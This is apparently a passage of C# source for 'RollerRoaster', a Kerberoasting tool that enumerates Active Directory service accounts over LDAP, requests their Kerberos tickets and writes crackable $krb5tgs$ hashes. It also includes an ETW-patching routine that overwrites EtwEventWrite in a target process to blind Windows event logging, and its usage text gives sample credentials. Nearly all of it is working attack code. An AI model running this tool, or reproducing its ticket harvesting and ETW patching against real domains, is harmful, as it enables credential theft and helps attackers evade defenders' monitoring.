using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.IdentityModel.Tokens;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.Collections.Generic;

namespace RollerRoaster
{
    class RollerRoaster
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref UIntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToWrite,
            out uint NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToRead,
            out uint NumberOfBytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlCopyMemory(IntPtr dest, IntPtr src, int length);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int LOGON32_PROVIDER_DEFAULT = 0;
        private const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

        // Dictionary to map etype values (hex) to their names and decimal values for hash formatting
        private static readonly Dictionary<byte, (string Name, int DecimalValue)> ETypeMap = new Dictionary<byte, (string, int)>
        {
            { 0x01, ("DES_CBC_CRC", 1) },
            { 0x03, ("DES_CBC_MD5", 3) },
            { 0x05, ("DES_CBC_MD4", 5) },
            { 0x17, ("RC4_HMAC", 23) },
            { 0x11, ("AES128_CTS_HMAC_SHA1_96", 17) },
            { 0x12, ("AES256_CTS_HMAC_SHA1_96", 18) },
            { 0x18, ("RC4_HMAC_DEFAULT", 24) }
        };

        static void WriteInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[*] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void WriteError(string message, params object[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n[-] ");
            Console.ResetColor();
            Console.WriteLine(message, args);
        }

        static void WriteWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.Write("\n[!] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void WriteSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("\n[+] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        static void Menu()
        {
            string[] RollerRoosterAscii = new string[]
            {
            "\n",
            "   ___              _       _                      ___                             _                     ",
            "  | _ \\    ___     | |     | |     ___      _ _   | _ \\    ___    __ _     ___    | |_     ___      _ _  ",
            "  |   /   / _ \\    | |     | |    / -_)    | '_|  |   /   / _ \\  / _` |   (_-<    |  _|   / -_)    | '_| ",
            "  |_|_\\   \\___/   _|_|_   _|_|_   \\___|   _|_|_   |_|_\\   \\___/  \\__,_|   /__/_   _\\__|   \\___|   _|_|_  ",
            "_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_",
            "\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"",
            "                                                                                                       ",
            "                                          Developed by Extravenger                                     "
            };

            foreach (string line in RollerRoosterAscii)
            {
                Console.WriteLine(line);
            }
            Console.WriteLine();
            WriteInfo("Usage: RollerRoaster.exe [options]\n");
            WriteInfo("Options:\n");
            Console.WriteLine("\t  /domain:<domain>        Specify the target domain (required)");
            Console.WriteLine("\t  /dc:<domain controller> Specify the domain controller (optional, will resolve automatically if not provided)");
            Console.WriteLine("\t  /username:<user@domain> Specify the username for authentication (optional)");
            Console.WriteLine("\t  /password:<password>    Specify the password for authentication (optional)");
            Console.WriteLine("\t  /list                   List all SPNs");
            Console.WriteLine("\t  /target:<username>      Query SPN for a specific user (optional)");
            Console.WriteLine("\t  /delay:<seconds>        Add a delay between SPN requests (optional)");
            Console.WriteLine("\t  /outfile:<file>         Specify an output file to save hashes (optional)");
            Console.WriteLine("\t  /patchetw:<PID>         Patch ETW in the specified process ID (optional)\n");
            WriteInfo("Example: .\\RollerRoaster.exe /domain:north.sevenkingdoms.local /username:amit@sevenkingdoms.local /password:Password123! /patchetw:9616");

            Console.Out.Flush();
            Environment.Exit(0);
        }

        // Simple Levenshtein distance implementation for typo detection
        static int ComputeLevenshteinDistance(string s, string t)
        {
            int[,] d = new int[s.Length + 1, t.Length + 1];
            for (int i = 0; i <= s.Length; i++)
                d[i, 0] = i;
            for (int j = 0; j <= t.Length; j++)
                d[0, j] = j;
            for (int i = 1; i <= s.Length; i++)
                for (int j = 1; j <= t.Length; j++)
                    d[i, j] = Math.Min(
                        Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1),
                        d[i - 1, j - 1] + (s[i - 1] == t[j - 1] ? 0 : 1));
            return d[s.Length, t.Length];
        }

        // Check if an argument is a potential typo of a valid argument
        static bool IsPotentialTypo(string input, string validArg, out string suggestion)
        {
            suggestion = validArg;
            if (input.Equals(validArg, StringComparison.OrdinalIgnoreCase))
                return false;

            int distance = ComputeLevenshteinDistance(input.ToLower(), validArg.ToLower());
            return distance <= 2 && distance > 0; // Allow up to 2 character differences
        }

        // Validate arguments and suggest correction for typos
        static void ValidateArgument(string arg)
        {
            string[] validArgs = new[] { "/domain", "/dc", "/username", "/password", "/list", "/target", "/delay", "/outfile", "/patchetw", "/help" };
            string argKey = arg.Contains(":") ? arg.Substring(0, arg.IndexOf(':')) : arg;

            foreach (string validArg in validArgs)
            {
                if (IsPotentialTypo(argKey, validArg, out string suggestion))
                {
                    WriteWarning($"Did you mean '{suggestion}' instead of '{argKey}'?");
                    Environment.Exit(1);
                }
            }

            if (!validArgs.Any(validArg => argKey.Equals(validArg, StringComparison.OrdinalIgnoreCase)))
            {
                WriteError($"Unrecognized argument: {argKey}. Exiting.");
                Environment.Exit(1);
            }
        }

        // Parse Kerberos ticket to extract etype
        static bool TryParseEType(byte[] ticket, out byte etype, out string etypeName, out int decimalEType)
        {
            etype = 0;
            etypeName = "UNKNOWN";
            decimalEType = 0;

            try
            {
                int index = 0;
                byte[] apReqContent;

                // Check for GSS-API wrapper (application tag 0, 0x60)
                if (index < ticket.Length && ticket[index] == 0x60)
                {
                    index++;
                    int gssLength = ReadAsn1Length(ticket, ref index);
                    if (index + gssLength > ticket.Length)
                    {
                        WriteWarning("GSS-API wrapper length exceeds ticket data.");
                        return false;
                    }

                    // Expect GSS-API OID (06 09 2A 86 48 86 F7 12 01 02 02)
                    if (index + 11 >= ticket.Length || ticket[index] != 0x06 || ticket[index + 1] != 0x09)
                    {
                        WriteWarning("Invalid GSS-API OID structure.");
                        return false;
                    }
                    index += 11; // Skip OID (9 bytes) + length (1) + flags (2)

                    // Dynamically scan for AP-REQ (0x6E) to handle unexpected bytes
                    int maxSkip = Math.Min(index + 10, ticket.Length); // Limit scanning to avoid runaway
                    while (index < maxSkip && ticket[index] != 0x6E)
                    {
                        index++;
                    }

                    // Expect AP-REQ (tag 0x6E) next
                    if (index >= ticket.Length || ticket[index] != 0x6E)
                    {
                        WriteWarning($"Incorrect ASN.1 application tag, expected 14 (0x6E), got {(index < ticket.Length ? $"0x{ticket[index]:X2}" : "EOF")}.");
                        return false;
                    }

                    index++;
                    int apReqLength = ReadAsn1Length(ticket, ref index);
                    if (index + apReqLength > ticket.Length)
                    {
                        WriteWarning("AP-REQ length exceeds ticket data.");
                        return false;
                    }

                    apReqContent = new byte[apReqLength];
                    Array.Copy(ticket, index, apReqContent, 0, apReqLength);
                    index += apReqLength;
                }
                else
                {
                    // No GSS-API wrapper, expect AP-REQ directly
                    if (index >= ticket.Length || ticket[index] != 0x6E)
                    {
                        WriteWarning($"Incorrect ASN.1 application tag, expected 14 (0x6E), got {(index < ticket.Length ? $"0x{ticket[index]:X2}" : "EOF")}.");
                        return false;
                    }

                    index++;
                    int apReqLength = ReadAsn1Length(ticket, ref index);
                    if (index + apReqLength > ticket.Length)
                    {
                        WriteWarning("AP-REQ length exceeds ticket data.");
                        return false;
                    }

                    apReqContent = new byte[apReqLength];
                    Array.Copy(ticket, index, apReqContent, 0, apReqLength);
                    index += apReqLength;
                }

                // Parse inner sequence of AP-REQ
                int seqIndex = 0;
                if (!ParseAsn1Sequence(apReqContent, ref seqIndex, out byte[] innerContent))
                {
                    WriteWarning("Failed to parse AP-REQ sequence.");
                    return false;
                }

                // Look for enc-part (context-specific tag 3, 0xA3)
                seqIndex = 0;
                while (seqIndex < innerContent.Length)
                {
                    if (seqIndex + 1 >= innerContent.Length)
                    {
                        WriteWarning("Incomplete enc-part tag.");
                        return false;
                    }

                    if (innerContent[seqIndex] == 0xA3)
                    {
                        seqIndex++;
                        int encPartLength = ReadAsn1Length(innerContent, ref seqIndex);
                        if (seqIndex + encPartLength > innerContent.Length)
                        {
                            WriteWarning("Enc-part length exceeds inner content.");
                            return false;
                        }

                        byte[] encPart = new byte[encPartLength];
                        Array.Copy(innerContent, seqIndex, encPart, 0, encPartLength);
                        seqIndex += encPartLength;

                        // Check if enc-part starts with unexpected tag 0x61
                        int encIndex = 0;
                        byte[] encInnerContent;
                        if (encIndex < encPart.Length && encPart[encIndex] == 0x61)
                        {
                            encIndex++;
                            int appTagLength = ReadAsn1Length(encPart, ref encIndex);
                            if (encIndex + appTagLength > encPart.Length)
                            {
                                WriteWarning("Application tag 0x61 length exceeds enc-part data.");
                                return false;
                            }

                            // Extract content of 0x61 tag and attempt to parse as sequence
                            byte[] appTagContent = new byte[appTagLength];
                            Array.Copy(encPart, encIndex, appTagContent, 0, appTagLength);
                            encIndex = 0;
                            if (!ParseAsn1Sequence(appTagContent, ref encIndex, out encInnerContent))
                            {
                                WriteWarning("Failed to parse sequence within application tag 0x61.");
                                return false;
                            }
                        }
                        else
                        {
                            // Parse enc-part sequence directly
                            if (!ParseAsn1Sequence(encPart, ref encIndex, out encInnerContent))
                            {
                                WriteWarning("Failed to parse enc-part sequence.");
                                return false;
                            }
                        }

                        // Look for etype (context-specific tag 0, 0xA0)
                        encIndex = 0;
                        while (encIndex < encInnerContent.Length)
                        {
                            if (encIndex + 2 >= encInnerContent.Length)
                            {
                                WriteWarning("Incomplete etype tag.");
                                return false;
                            }

                            if (encInnerContent[encIndex] == 0xA0)
                            {
                                encIndex++;
                                int etypeLength = ReadAsn1Length(encInnerContent, ref encIndex);
                                if (encIndex + etypeLength > encInnerContent.Length)
                                {
                                    WriteWarning("Etype length exceeds inner content.");
                                    return false;
                                }

                                if (encInnerContent[encIndex] == 0x02 && encInnerContent[encIndex + 1] == 0x01)
                                {
                                    byte etypeValue = encInnerContent[encIndex + 2];
                                    if (ETypeMap.ContainsKey(etypeValue))
                                    {
                                        etype = etypeValue;
                                        etypeName = ETypeMap[etype].Name;
                                        decimalEType = ETypeMap[etype].DecimalValue;
                                        return true;
                                    }
                                    else
                                    {
                                        WriteWarning($"Unknown etype value: 0x{etypeValue:X2}");
                                        return false;
                                    }
                                }
                                encIndex += etypeLength;
                            }
                            else
                            {
                                encIndex++;
                            }
                        }
                    }
                    else
                    {
                        seqIndex++;
                    }
                }

                WriteWarning("No valid etype found in ticket enc-part.");
                return false;
            }
            catch (Exception ex)
            {
                WriteWarning($"Error parsing etype: {ex.Message}");
                return false;
            }
        }

        // Helper to parse ASN.1 sequence and extract content
        static bool ParseAsn1Sequence(byte[] data, ref int index, out byte[] content)
        {
            content = null;
            if (index >= data.Length || data[index] != 0x30) // Sequence tag
            {
                WriteWarning($"Expected sequence tag (0x30) at index {index}, got {(index < data.Length ? $"0x{data[index]:X2}" : "EOF")}.");
                return false;
            }

            index++;
            int length = ReadAsn1Length(data, ref index);
            if (index + length > data.Length)
            {
                WriteWarning($"Sequence length {length} exceeds data at index {index}.");
                return false;
            }

            content = new byte[length];
            Array.Copy(data, index, content, 0, length);
            index += length;
            return true;
        }

        // Helper to read ASN.1 length field
        static int ReadAsn1Length(byte[] data, ref int index)
        {
            if (index >= data.Length)
            {
                WriteWarning("Reached end of data while reading length.");
                return 0;
            }

            if (data[index] < 0x80)
            {
                return data[index++];
            }
            else
            {
                int lengthBytes = data[index++] & 0x7F;
                if (index + lengthBytes > data.Length)
                {
                    WriteWarning($"Length bytes {lengthBytes} exceed data at index {index}.");
                    return 0;
                }

                int length = 0;
                for (int i = 0; i < lengthBytes; i++)
                {
                    length = (length << 8) + data[index++];
                }
                return length;
            }
        }

        static bool PatchEtw(int pid)
        {
            try
            {
                Console.WriteLine();
                WriteInfo($"Patching ETW targeting PID: {pid}");
                string etwFunc = "EtwEventWrite";
                string ntdll = "ntdll.dll";
                int ptrSize = IntPtr.Size;

                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    WriteError("[!] Failed to open process with PID {0}. Error: {1}", pid, Marshal.GetLastWin32Error());
                    return false;
                }

                try
                {
                    IntPtr etwAddr = GetFunctionAddress(ntdll, etwFunc);
                    if (etwAddr == IntPtr.Zero)
                    {
                        WriteError("[!] Failed to resolve {0}.", etwFunc);
                        return false;
                    }

                    byte[] originalBytes = new byte[ptrSize == 8 ? 1 : 3];
                    IntPtr originalBytesPtr = Marshal.AllocHGlobal(originalBytes.Length);
                    uint bytesRead;
                    int readResult = NtReadVirtualMemory(hProcess, etwAddr, originalBytesPtr, (uint)originalBytes.Length, out bytesRead);
                    if (readResult != 0)
                    {
                        WriteError("[!] Failed to read original bytes. Error: {0}", readResult);
                        Marshal.FreeHGlobal(originalBytesPtr);
                        return false;
                    }
                    Marshal.Copy(originalBytesPtr, originalBytes, 0, originalBytes.Length);
                    Marshal.FreeHGlobal(originalBytesPtr);

                    // Change memory protection
                    uint etwOldProtect;
                    UIntPtr etwSize = (UIntPtr)(ptrSize == 8 ? 1 : 3);
                    IntPtr etwBaseAddr = etwAddr;
                    int protectResult = NtProtectVirtualMemory(hProcess, ref etwBaseAddr, ref etwSize, PAGE_EXECUTE_WRITECOPY, out etwOldProtect);
                    if (protectResult != 0)
                    {
                        WriteError("[!] Error changing permissions for {0}. Error: {1}", etwFunc, protectResult);
                        return false;
                    }

                    try
                    {
                        byte[] etwPatch = ptrSize == 8 ? new byte[] { 0xC3 } : new byte[] { 0xB8, 0xFF, 0x55 };
                        IntPtr etwPatchPtr = Marshal.AllocHGlobal(etwPatch.Length);
                        Marshal.Copy(etwPatch, 0, etwPatchPtr, etwPatch.Length);

                        uint bytesWritten;
                        int writeResult = NtWriteVirtualMemory(hProcess, etwAddr, etwPatchPtr, (uint)etwPatch.Length, out bytesWritten);
                        Marshal.FreeHGlobal(etwPatchPtr);
                        if (writeResult != 0)
                        {
                            WriteError("[!] Error writing patch to {0}. Error: {1}", etwFunc, writeResult);
                            return false;
                        }

                        byte[] verifyBytes = new byte[etwPatch.Length];
                        IntPtr verifyBytesPtr = Marshal.AllocHGlobal(verifyBytes.Length);
                        int verifyResult = NtReadVirtualMemory(hProcess, etwAddr, verifyBytesPtr, (uint)verifyBytes.Length, out bytesRead);
                        if (verifyResult != 0)
                        {
                            WriteError("[!] Error reading patched bytes. Error: {0}", verifyResult);
                            Marshal.FreeHGlobal(verifyBytesPtr);
                            return false;
                        }
                        Marshal.Copy(verifyBytesPtr, verifyBytes, 0, verifyBytes.Length);
                        Marshal.FreeHGlobal(verifyBytesPtr);

                        for (int i = 0; i < etwPatch.Length; i++)
                        {
                            if (verifyBytes[i] != etwPatch[i])
                            {
                                WriteError("[!] Error verifying patch for {0}", etwFunc);
                                return false;
                            }
                        }
                    }
                    finally
                    {
                        uint etwRestoreProtect;
                        NtProtectVirtualMemory(hProcess, ref etwBaseAddr, ref etwSize, etwOldProtect, out etwRestoreProtect);
                    }

                    WriteSuccess($"ETW patched successfully");
                    return true;
                }
                finally
                {
                    CloseHandle(hProcess);
                }
            }
            catch (Exception ex)
            {
                WriteError("[!] Unexpected error while patching ETW: {0}", ex.Message);
                return false;
            }
        }

        static IntPtr GetFunctionAddress(string moduleName, string functionName)
        {
            IntPtr hModule = GetModuleHandle(moduleName);
            if (hModule == IntPtr.Zero)
                return IntPtr.Zero;

            return GetProcAddress(hModule, functionName);
        }

        static bool IsDomainControllerReachable(string dcName, string username = null, string password = null)
        {
            try
            {
                using (var connection = new LdapConnection(new LdapDirectoryIdentifier(dcName, 389)))
                {
                    connection.Timeout = TimeSpan.FromSeconds(10);
                    if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                    {
                        connection.Credential = new NetworkCredential(username, password);
                        connection.AuthType = AuthType.Basic;
                    }
                    else
                    {
                        connection.AuthType = AuthType.Negotiate;
                    }
                    connection.Bind();
                    return true;
                }
            }
            catch (Exception ex)
            {
                WriteWarning($"Failed to bind to {dcName}: {ex.Message}");
                return false;
            }
        }

        static string ResolveBestDomainController(string targetDomain, string username = null, string password = null)
        {
            try
            {
                DirectoryContext context = new DirectoryContext(DirectoryContextType.Domain, targetDomain);
                Domain domainObj = Domain.GetDomain(context);
                foreach (DomainController dc in domainObj.DomainControllers)
                {
                    if (IsDomainControllerReachable(dc.Name, username, password))
                    {
                        WriteSuccess($"Selected Domain Controller: {dc.Name}");
                        domainObj.Dispose();
                        return dc.Name;
                    }
                }
                domainObj.Dispose();
                WriteWarning("No reachable domain controllers found. Check your supplied credentials and try again.");
                Environment.Exit(1);
                return null;
            }
            catch (Exception ex)
            {
                WriteWarning($"Error resolving domain controllers: {ex.Message}");
                Environment.Exit(1);
                return null;
            }
        }

        static bool IsDomainReachable(string domain)
        {
            try
            {
                var domainController = Dns.GetHostEntry(domain);
                return domainController.AddressList.Length > 0;
            }
            catch
            {
                return false;
            }
        }

        static bool ValidateOutputFilePath(string filePath)
        {
            try
            {
                string fullPath = Path.GetFullPath(filePath);
                string directory = Path.GetDirectoryName(fullPath);
                return true;
            }
            catch (Exception ex)
            {
                WriteWarning($"Error: Invalid output file path '{filePath}': {ex.Message}");
                return false;
            }
        }

        static bool ValidateUsernameFormat(string username)
        {
            if (string.IsNullOrEmpty(username))
                return false;

            return Regex.IsMatch(username, @"^[^@]+@[^@]+$");
        }

        static WindowsImpersonationContext ImpersonateUser(string username, string password, string domain)
        {
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                bool logonSuccess = LogonUser(
                    username.Split('@')[0],
                    domain,
                    password,
                    LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_DEFAULT,
                    out tokenHandle
                );

                if (!logonSuccess)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"Failed to logon user {username}: Win32 Error {error}");
                }

                WindowsIdentity identity = new WindowsIdentity(tokenHandle);
                return identity.Impersonate();
            }
            catch
            {
                if (tokenHandle != IntPtr.Zero)
                    CloseHandle(tokenHandle);
                throw;
            }
        }

        static byte[] RequestKerberosTicket(string spn, string username, string password, string domain)
        {
            WindowsImpersonationContext impersonationContext = null;
            try
            {
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    impersonationContext = ImpersonateUser(username, password, domain);
                }

                KerberosRequestorSecurityToken ticket = new KerberosRequestorSecurityToken(spn);
                return ticket.GetRequest();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to request Kerberos ticket: {ex.Message}");
            }
            finally
            {
                if (impersonationContext != null)
                {
                    impersonationContext.Undo();
                    impersonationContext.Dispose();
                }
            }
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Menu();
            }

            // Validate arguments for typos
            foreach (string arg in args)
            {
                ValidateArgument(arg);
            }

            string currentDomain = null;
            string domainController = null;
            int delaySeconds = 0;
            string outputFile = null;
            string targetUser = null;
            string username = null;
            string password = null;
            int patchPid = -1;

            foreach (string arg in args)
            {
                if (arg.Equals("/help"))
                    Menu();
                if (arg.StartsWith("/domain:"))
                    currentDomain = arg.Substring("/domain:".Length);
                if (arg.StartsWith("/dc:"))
                    domainController = arg.Substring("/dc:".Length);
                if (arg.StartsWith("/delay:"))
                    int.TryParse(arg.Substring("/delay:".Length), out delaySeconds);
                if (arg.StartsWith("/outfile:"))
                    outputFile = arg.Substring("/outfile:".Length);
                if (arg.StartsWith("/target:"))
                    targetUser = arg.Substring("/target:".Length);
                if (arg.StartsWith("/username:"))
                    username = arg.Substring("/username:".Length);
                if (arg.StartsWith("/password:"))
                    password = arg.Substring("/password:".Length);
                if (arg.StartsWith("/patchetw:"))
                    int.TryParse(arg.Substring("/patchetw:".Length), out patchPid);
            }

            if (string.IsNullOrEmpty(currentDomain))
            {
                WriteWarning("Error: Domain parameter is required.");
                Menu();
            }

            if (!string.IsNullOrEmpty(username) && !ValidateUsernameFormat(username))
            {
                WriteWarning("Error: Username must be in the format user@domain.");
                Environment.Exit(1);
            }

            if (!string.IsNullOrEmpty(username) ^ !string.IsNullOrEmpty(password))
            {
                WriteWarning("Error: Both /username and /password must be provided together.");
                Environment.Exit(1);
            }

            if (!string.IsNullOrEmpty(outputFile) && !ValidateOutputFilePath(outputFile))
            {
                Environment.Exit(1);
            }

            if (!string.IsNullOrEmpty(currentDomain) && !IsDomainReachable(currentDomain))
            {
                WriteWarning($"Error: The domain '{currentDomain}' cannot be contacted.");
                Environment.Exit(1);
            }

            // Perform ETW patching if PID is provided
            if (patchPid != -1)
            {
                bool patchResult = PatchEtw(patchPid);
                if (!patchResult)
                {
                    WriteError("ETW patching failed. Exiting.");
                    Environment.Exit(1);
                }
            }

            try
            {
                WriteSuccess($"Running in domain: {currentDomain}");
                if (string.IsNullOrEmpty(domainController))
                {
                    if (!string.IsNullOrEmpty(currentDomain))
                    {
                        domainController = ResolveBestDomainController(currentDomain, username, password);
                    }

                    if (string.IsNullOrEmpty(domainController))
                    {
                        WriteWarning("Error: No domain controller specified, and could not resolve one.");
                        Environment.Exit(1);
                    }
                }
                Console.WriteLine();

                string ldapPath = $"LDAP://{domainController}/DC={currentDomain.Replace(".", ",DC=")}";
                DirectoryEntry domainEntry;

                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    domainEntry = new DirectoryEntry(ldapPath, username, password, AuthenticationTypes.Secure);
                }
                else
                {
                    domainEntry = new DirectoryEntry(ldapPath);
                }

                try
                {
                    object test = domainEntry.NativeObject;
                }
                catch (Exception ex)
                {
                    WriteWarning($"Error: Failed to bind to LDAP at {ldapPath}: {ex.Message}");
                    Environment.Exit(1);
                }

                string filter = string.IsNullOrEmpty(targetUser)
                    ? "(&(objectCategory=user)(|(servicePrincipalName=HTTP/*)(servicePrincipalName=MSSQLSvc/*)(servicePrincipalName=HOST/*)(servicePrincipalName=EXCHANGE/*)(servicePrincipalName=CIFS/*)(servicePrincipalName=WSMAN/*)(servicePrincipalName=ldap/*)(servicePrincipalName=IMAP/*)(servicePrincipalName=SMTP/*))(!(samAccountName=krbtgt)))"
                    : $"(&(objectCategory=user)(samAccountName={targetUser})(|(servicePrincipalName=HTTP/*)(servicePrincipalName=MSSQLSvc/*)(servicePrincipalName=HOST/*)(servicePrincipalName=EXCHANGE/*)(servicePrincipalName=CIFS/*)(servicePrincipalName=WSMAN/*)(servicePrincipalName=ldap/*)(servicePrincipalName=IMAP/*)(servicePrincipalName=SMTP/*)))";

                using (DirectorySearcher searcher = new DirectorySearcher
                {
                    Filter = filter,
                    PageSize = 200,
                    SearchScope = System.DirectoryServices.SearchScope.Subtree,
                    SearchRoot = domainEntry
                })
                {
                    searcher.PropertiesToLoad.AddRange(new[] { "samAccountName", "servicePrincipalName", "distinguishedName", "pwdLastSet" });

                    using (SearchResultCollection results = searcher.FindAll())
                    {
                        if (results.Count == 0)
                        {
                            WriteWarning($"No SPNs found in {currentDomain}.");
                            Environment.Exit(0);
                        }

                        bool listSpns = args.Any(arg => arg.Equals("/list"));
                        if (listSpns)
                        {
                            WriteInfo($"Total users with SPNs in {currentDomain}: {results.Count}\n");
                            WriteInfo("Listing all SPNs:\n");

                            const int samWidth = 20;
                            const int dnWidth = 60;
                            const int spnWidth = 50;

                            Console.WriteLine($"+{new string('-', samWidth + 2)}+{new string('-', dnWidth + 2)}+{new string('-', spnWidth + 2)}+");
                            Console.WriteLine($"| {"samAccountName",-samWidth} | {"distinguishedName",-dnWidth} | {"servicePrincipalName",-spnWidth} |");
                            Console.WriteLine($"+{new string('-', samWidth + 2)}+{new string('-', dnWidth + 2)}+{new string('-', spnWidth + 2)}+");

                            foreach (SearchResult result in results)
                            {
                                var user = result.Properties;
                                string samAccountName = user.Contains("samAccountName") && user["samAccountName"].Count > 0 ? user["samAccountName"][0].ToString() : "N/A";
                                string spn = user.Contains("servicePrincipalName") && user["servicePrincipalName"].Count > 0 ? user["servicePrincipalName"][0].ToString() : "N/A";
                                string distinguishedName = user.Contains("distinguishedName") && user["distinguishedName"].Count > 0 ? user["distinguishedName"][0].ToString() : "N/A";

                                if (spn == "N/A")
                                {
                                    WriteWarning($"Skipping user {samAccountName}: No SPN found.");
                                    continue;
                                }

                                samAccountName = samAccountName.Length > samWidth - 2 ? samAccountName.Substring(0, samWidth - 5) + "..." : samAccountName;
                                distinguishedName = distinguishedName.Length > dnWidth - 2 ? distinguishedName.Substring(0, dnWidth - 5) + "..." : distinguishedName;
                                spn = spn.Length > spnWidth - 2 ? spn.Substring(0, spnWidth - 5) + "..." : spn;

                                Console.WriteLine($"| {samAccountName,-samWidth} | {distinguishedName,-dnWidth} | {spn,-spnWidth} |");
                                Console.WriteLine($"+{new string('-', samWidth + 2)}+{new string('-', dnWidth + 2)}+{new string('-', spnWidth + 2)}+");
                            }
                            Console.WriteLine();
                            Environment.Exit(0);
                        }

                        foreach (SearchResult result in results)
                        {
                            var user = result.Properties;
                            if (!user.Contains("samAccountName") || user["samAccountName"].Count == 0 ||
                                !user.Contains("servicePrincipalName") || user["servicePrincipalName"].Count == 0 ||
                                !user.Contains("distinguishedName") || user["distinguishedName"].Count == 0)
                            {
                                WriteWarning("Skipping user: Missing required attributes.");
                                continue;
                            }

                            string samAccountName = user["samAccountName"][0].ToString();
                            string spn = user["servicePrincipalName"][0].ToString();
                            string distinguishedName = user["distinguishedName"][0].ToString();
                            string pwdLastSet = user.Contains("pwdLastSet") && user["pwdLastSet"].Count > 0
                                ? DateTime.FromFileTime((long)user["pwdLastSet"][0]).ToString("M/d/yyyy h:mm:ss tt")
                                : "N/A";
                            string hashFormat = null;
                            string targetFile = outputFile;

                            try
                            {
                                string domainForKerberos = !string.IsNullOrEmpty(username) ? username.Split('@')[1] : currentDomain;
                                byte[] ticketByteStream = RequestKerberosTicket(spn, username, password, domainForKerberos);
                                string ticketHexStream = BitConverter.ToString(ticketByteStream).Replace("-", "");

                                if (!TryParseEType(ticketByteStream, out byte etype, out string supportedETypes, out int decimalEType))
                                {
                                    WriteWarning($"Skipping user {samAccountName}: Unable to determine etype.");
                                    continue;
                                }

                                // Override etype to RC4_HMAC if DES_CBC_MD4 is detected
                                if (etype == 0x05)
                                {
                                    etype = 0x17;
                                    supportedETypes = "RC4_HMAC";
                                    decimalEType = 23;
                                }

                                var match = Regex.Match(ticketHexStream, @"A282(?<CipherTextLen>....)........(?<DataToEnd>.+)");
                                if (match.Success)
                                {
                                    if (etype == 0x12 && !string.IsNullOrEmpty(outputFile))
                                    {
                                        string fullPath = Path.GetFullPath(outputFile);
                                        string directory = Path.GetDirectoryName(fullPath);
                                        string fileName = Path.GetFileNameWithoutExtension(fullPath);
                                        string extension = Path.GetExtension(fullPath);
                                        targetFile = Path.Combine(directory, $"18-{fileName}{extension}");
                                    }

                                    uint cipherTextLen = Convert.ToUInt32(match.Groups["CipherTextLen"].Value, 16) - 4;
                                    string cipherText = match.Groups["DataToEnd"].Value.Substring(0, (int)(cipherTextLen * 2));
                                    string hash;

                                    if (etype == 0x11 || etype == 0x12) // AES128 or AES256
                                    {
                                        int checksumStart = cipherText.Length - 24;
                                        hash = $"{cipherText.Substring(checksumStart)}${cipherText.Substring(0, checksumStart)}";
                                    }
                                    else // RC4_HMAC or others
                                    {
                                        hash = $"{cipherText.Substring(0, 32)}${cipherText.Substring(32)}";
                                    }

                                    string spnWithDomain = $"{spn}@{currentDomain}";
                                    hashFormat = $"$krb5tgs${decimalEType}$*{samAccountName}${currentDomain}${spnWithDomain}*${hash}";

                                    if (!string.IsNullOrEmpty(outputFile))
                                    {
                                        try
                                        {
                                            File.AppendAllText(Path.GetFullPath(outputFile), hashFormat + Environment.NewLine);
                                            if (etype == 0x12 && targetFile != outputFile)
                                            {
